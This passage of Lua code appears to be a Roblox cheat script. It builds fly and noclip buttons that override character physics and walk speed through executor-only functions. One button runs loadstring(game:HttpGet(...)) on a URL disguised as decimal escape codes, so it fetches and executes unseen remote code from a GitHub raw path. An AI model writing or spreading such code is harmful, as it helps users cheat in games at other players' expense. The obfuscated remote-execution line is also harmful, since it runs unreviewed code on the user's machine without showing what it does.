    TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextButton.Position = UDim2.new(0.588996768, 0, 0.279716104, 0)
    TextButton.Size = UDim2.new(0.369741112, 0, 0.433398396, 0)
    TextButton.Font = Enum.Font.SourceSans
    TextButton.Text = "Fly"
    TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.TextScaled = true
    TextButton.TextSize = 14.000
    TextButton.TextStrokeTransparency = 0.000
    TextButton.TextWrapped = true
    
    TextButton_2.Parent = Frame
    TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextButton_2.Position = UDim2.new(0.0622977614, 0, 0.28381446, 0)
    TextButton_2.Size = UDim2.new(0.372168273, 0, 0.429300278, 0)
    TextButton_2.Font = Enum.Font.SourceSans
    TextButton_2.Text = "Noclip+fly"
    TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextButton_2.TextScaled = true
    TextButton_2.TextSize = 14.000
    TextButton_2.TextStrokeTransparency = 0.000
    TextButton_2.TextWrapped = true
    
    -- Scripts:
    
    local function INDYFQN_fake_script() -- Frame.GuiDrag 
        local script = Instance.new('LocalScript', Frame)
    
        local 	Frame = script.Parent.Parent.Frame
        
        Frame.Draggable = true
        Frame.Active = true
        
        
        
    end
    coroutine.wrap(INDYFQN_fake_script)()
    local function TZCHT_fake_script() -- TextButton.LocalScript 
        local script = Instance.new('LocalScript', TextButton)
    
        local keys = {
            LeftShift = false,
        }
        game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(key)
            if key == "0" then
                keys.LeftShift = true
            end
        end)
        game.Players.LocalPlayer:GetMouse().KeyUp:Connect(function(key)
            if key == "0" then
                keys.LeftShift = false
            end
        end)
        local hack = false
        script.Parent.MouseButton1Click:Connect(function()
            hack = not hack
            if hack then
                script.Parent.Text = "Fly"
                script.Parent.BackgroundColor3 = Color3.fromRGB(0,255,0)
                local humanoid = nil
                while hack do
                    local fps = game["Run Service"].RenderStepped:Wait()
                    if not humanoid or not humanoid.Parent or not humanoid.Parent.Parent then
                        if game.Players.LocalPlayer.Character then
                            if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
                                humanoid = game.Players.LocalPlayer.Character.Humanoid
                                humanoid.PlatformStand = true
                            end
                        end
                    else
                        humanoid.PlatformStand = true
                        if humanoid.RootPart then
                            if humanoid.RootPart:FindFirstChild("NoGravity") then
                                humanoid.RootPart.NoGravity.Force = Vector3.new(0,workspace.Gravity*humanoid.RootPart.AssemblyMass,0)
                            else
                                local no = Instance.new("BodyForce",humanoid.RootPart)
                                no.Name = "NoGravity"
                                no.Force = Vector3.new(0,workspace.Gravity*humanoid.RootPart.AssemblyMass,0)
                            end
                            local vel = humanoid.MoveDirection*humanoid.WalkSpeed
                            if humanoid.Jump then
                                vel = vel+Vector3.new(0,humanoid.WalkSpeed,0)
                            end
                            if keys.LeftShift then
                                vel = vel+Vector3.new(0,-humanoid.WalkSpeed,0)
                            end
                            humanoid.RootPart.Velocity = ((humanoid.RootPart.Velocity-vel)*(0.75^(30/(1/fps))))+vel
                            getgenv().WalkSpeedValue = _G.Fly; -- Cambia el 100 por el valor que quieras
    local Player = game:service'Players'.LocalPlayer;
    Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
    Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
    end)
    Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
                        end
                    end
                end
            else
                script.Parent.Text = "Fly"
                script.Parent.BackgroundColor3 = Color3.fromRGB(255,0,0)
                game["Run Service"].RenderStepped:Wait()
                game["Run Service"].RenderStepped:Wait()
                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
                    game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
                    if game.Players.LocalPlayer.Character.Humanoid.RootPart and game.Players.LocalPlayer.Character.Humanoid.RootPart:FindFirstChild("NoGravity") then
                        game.Players.LocalPlayer.Character.Humanoid.RootPart.NoGravity:Destroy()
                        getgenv().WalkSpeedValue = 16; -- Cambia el 100 por el valor que quieras
    local Player = game:service'Players'.LocalPlayer;
    Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
    Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
    end)
    Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
                    end
                end
            end
        end)
    end
    coroutine.wrap(TZCHT_fake_script)()
    local function WYLWY_fake_script() -- TextButton_2.LocalScript 
        local script = Instance.new('LocalScript', TextButton_2)
    
        local keys = {
            LeftShift = false,
        }
        game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(key)
            if key == "0" then
                keys.LeftShift = true
            end
        end)
        game.Players.LocalPlayer:GetMouse().KeyUp:Connect(function(key)
            if key == "0" then
                keys.LeftShift = false
            end
        end)
        local hack = false
        script.Parent.MouseButton1Click:Connect(function()
            hack = not hack
            if hack then
                script.Parent.Text = "Noclip+fly"
                script.Parent.BackgroundColor3 = Color3.fromRGB(0,255,0)
                local humanoid = nil
                while hack do
                    local fps = game["Run Service"].RenderStepped:Wait()
                    if not humanoid or not humanoid.Parent or not humanoid.Parent.Parent then
                        if game.Players.LocalPlayer.Character then
                            if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
                                humanoid = game.Players.LocalPlayer.Character.Humanoid
                                if humanoid.RootPart then
                                    humanoid.RootPart.Anchored = true
                                    getgenv().WalkSpeedValue = _G.NoclipFly; -- Cambia el 100 por el valor que quieras
    local Player = game:service'Players'.LocalPlayer;
    Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
    Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
    end)
    Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
                                end
                            end
                        end
                    else
                        if humanoid.RootPart then
                            humanoid.RootPart.Anchored = true
                            local vel = humanoid.MoveDirection*humanoid.WalkSpeed
                            if humanoid.Jump then
                                vel = vel+Vector3.new(0,humanoid.WalkSpeed,0)
                            end
                            if keys.LeftShift then
                                vel = vel+Vector3.new(0,-humanoid.WalkSpeed,0)
                            end
                            humanoid.RootPart.Velocity = ((humanoid.RootPart.Velocity-vel)*(0.75^(30/(1/fps))))+vel
                            humanoid.RootPart.CFrame = (humanoid.RootPart.CFrame+(humanoid.RootPart.Velocity*fps))*CFrame.Angles(humanoid.RootPart.RotVelocity.X*fps,humanoid.RootPart.RotVelocity.Y*fps,humanoid.RootPart.RotVelocity.Z*fps)
                        end
                    end
                end
            else
                script.Parent.Text = "Noclip+fly"
                script.Parent.BackgroundColor3 = Color3.fromRGB(255,0,0)
                game["Run Service"].RenderStepped:Wait()
                game["Run Service"].RenderStepped:Wait()
                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and game.Players.LocalPlayer.Character.Humanoid.RootPart then
                    game.Players.LocalPlayer.Character.Humanoid.RootPart.Anchored = false
                    getgenv().WalkSpeedValue = 16; -- Cambia el 100 por el valor que quieras
    local Player = game:service'Players'.LocalPlayer;
    Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
    Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
    end)
    Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
                end
            end
        end)
    end
    coroutine.wrap(WYLWY_fake_script)()
    local function XFAYFBB_fake_script() -- ScreenGui.GuiDrag 
        local script = Instance.new('LocalScript', ScreenGui)
    
        local gui = script.Parent.Parent.Frame --Change this on your mainFrame
        
        Frame.Draggable = true
        Frame.Active = true
        
    end
    coroutine.wrap(XFAYFBB_fake_script)()
    end)
    FlySection:NewLabel("========================================")
    FlySection:NewButton("Fly | (Not recommended fly)", "Press Z to toggle", function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\109\97\105\110\47\70\108\121\47\72\111\114\115\101\102\108\121\47\90\122\122"))()
    end)
    FlySection:NewLabel("========================================")
    FlySection:NewSlider("Op Start Fly Speed", "Speed of the OP Fly!", 40, 0, function(s) -- 25 (MaxValue) | 0 (MinValue)
        _G.FlySpeeed3 = s
    end)
    
    
    FlySection:NewButton("Op Fly", "Press ? to toggle", function()
        -- Bring to you by 7alexv7
    -- Enjoy the script!
    
    -- Instances:
    
    local FlyGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local TextButton = Instance.new("TextButton")
    local TextLabel = Instance.new("TextLabel")
    
    --Properties:
    
    FlyGui.Name = "FlyGui"
    FlyGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    Frame.Parent = FlyGui
    Frame.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0.0685602352, 0, 0.168769717, 0)
    Frame.Size = UDim2.new(0.264544547, 0, 0.100000024, 0)
    
    TextButton.Parent = Frame
    TextButton.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
    TextButton.BorderSizePixel = 0
    TextButton.Position = UDim2.new(0.06324628, 0, 0.400667697, 0)
    TextButton.Size = UDim2.new(0.871157169, 0, 0.495614201, 0)
    TextButton.Font = Enum.Font.ArialBold
    TextButton.Text = "Fly"
    TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.TextScaled = true
    TextButton.TextSize = 14.000
    TextButton.TextStrokeTransparency = 0.000
    TextButton.TextWrapped = true
    
    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.Size = UDim2.new(0, 86, 0, 24)
    TextLabel.Font = Enum.Font.Oswald
    TextLabel.Text = "Robbed XD"
    TextLabel.TextColor3 = Color3.fromRGB(255, 0, 255)
    TextLabel.TextScaled = true
    TextLabel.TextSize = 14.000
    TextLabel.TextWrapped = true
    
    -- Scripts:
    
    local function NQWSTGE_fake_script() -- Frame.Fly 
        local script = Instance.new('LocalScript', Frame)
    
        local plr = script.Parent.Parent.Parent.Parent
        repeat wait() until plr and plr.Character and plr.Character:findFirstChild("HumanoidRootPart") and plr.Character:findFirstChild("Humanoid") 
        local mouse = game.Players.LocalPlayer:GetMouse()  
        repeat wait() until mouse
        
        local torso = plr.Character.HumanoidRootPart 
        local flying = false
        local deb = true 
        local ctrl = {f = 0, b = 0, l = 0, r = 0} 
        local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
        local maxspeed = _G.FlySpeeed3
        local speed = _G.FlySpeeed3
        function Fly() 
        local bg = Instance.new("BodyGyro", torso) 
        bg.P = 9e4 
        bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
        bg.cframe = torso.CFrame 
        local bv = Instance.new("BodyVelocity", torso) 
        bv.velocity = Vector3.new(0,0.1,0) 
        bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
        repeat wait() 
        plr.Character.Humanoid.PlatformStand = true 
        if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
        speed = speed+.5+(speed/maxspeed) 
        if speed > maxspeed then 
        speed = maxspeed 
        end 
        elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
        speed = speed-1 
        if speed < 0 then 
                        speed = 0
                    else
                        speed = _G.FlySpeeed3
        end 
        end 
        if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
        bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
        lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
        elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
        bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
        else 
        bv.velocity = Vector3.new(0,0.1,0) 
        end 
        bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
        until not flying 
        ctrl = {f = 0, b = 0, l = 0, r = 0} 
        lastctrl = {f = 0, b = 0, l = 0, r = 0} 
            
        bg:Destroy() 
        bv:Destroy() 
            plr.Character.Humanoid.PlatformStand = false 
            speed = _G.FlySpeeed3
        end 
        
        mouse.KeyDown:connect(function(key) 
        if key:lower() == "e" then 
                if flying then flying = false 
                    speed = _G.FlySpeeed3
        else 
        flying = true 
        Fly()
        
        end 
        elseif key:lower() == "w" then 
        ctrl.f = 1 
        elseif key:lower() == "s" then 
        ctrl.b = -1 
        elseif key:lower() == "a" then 
        ctrl.l = -1 
        elseif key:lower() == "d" then 
        ctrl.r = 1 
        end 
        end) 
        mouse.KeyUp:connect(function(key) 
        if key:lower() == "w" then 
        ctrl.f = 0 
        elseif key:lower() == "s" then 
        ctrl.b = 0 
        elseif key:lower() == "a" then 
        ctrl.l = 0 
        elseif key:lower() == "d" then 
        ctrl.r = 0 
        end 
        end)
        
        plr.Character.Humanoid.StateChanged:Connect(function(o,n)
            if n == Enum.HumanoidStateType.Running then
                ctrl.f = 1
            else
                ctrl.f = 0
            end
        
        end)
        script.Parent.TextButton.MouseButton1Click:Connect(function()
            if flying then
                flying = false
                speed = _G.FlySpeeed3
            else
                flying = true
                Fly()
            end
        end)
        
    end
    coroutine.wrap(NQWSTGE_fake_script)()
    local function RAQA_fake_script() -- Frame.Buttons 
        local script = Instance.new('LocalScript', Frame)
    
        local Trigger = script.Parent.MiniTrext
        local IsMini = false
        function CreateTween(Instance,Style,Direction,Time,table,RepeatCount,CanRepeat,Delay)
            local ts = game:GetService("TweenService")
            local TweenInfo = TweenInfo.new(Time,Style,Direction,RepeatCount,CanRepeat,Delay)
            local Tween = ts:Create(Instance,TweenInfo,table)
            repeat wait() until Tween ~= nil
            return Tween
            
        end
        Trigger.MouseButton1Click:Connect(function()
            if IsMini then
                CreateTween(script.Parent,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0.5,{Size = UDim2.new(0.265, 0,0.1, 0)},0,false,0.1):Play()
                IsMini = false
                Trigger.Text = "-"
            else
                CreateTween(script.Parent,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0.5,{Size = UDim2.new(0.265, 0,0.042, 0)},0,false,0.1):Play()
                IsMini = true
                Trigger.Text = "+"
            end
        end)
        script.Parent.Delete.MouseButton1Click:Connect(function()
            script.Parent.Parent:Destroy()
        end)
    end
    coroutine.wrap(RAQA_fake_script)()
    local function TKVUMP_fake_script() -- Frame.Drag Gui 
        local script = Instance.new('LocalScript', Frame)
    
        local UserInputService = game:GetService("UserInputService")
        
        local gui = script.Parent
        
        local dragging
        local dragInput
        local dragStart
        local startPos
        
        local function update(input)
            local delta = input.Position - dragStart
            gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
        
        gui.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = gui.Position
                
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end)
        
        gui.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        
        UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end)
    end
    coroutine.wrap(TKVUMP_fake_script)()
    end)
    FlySection:NewLabel("========================================")
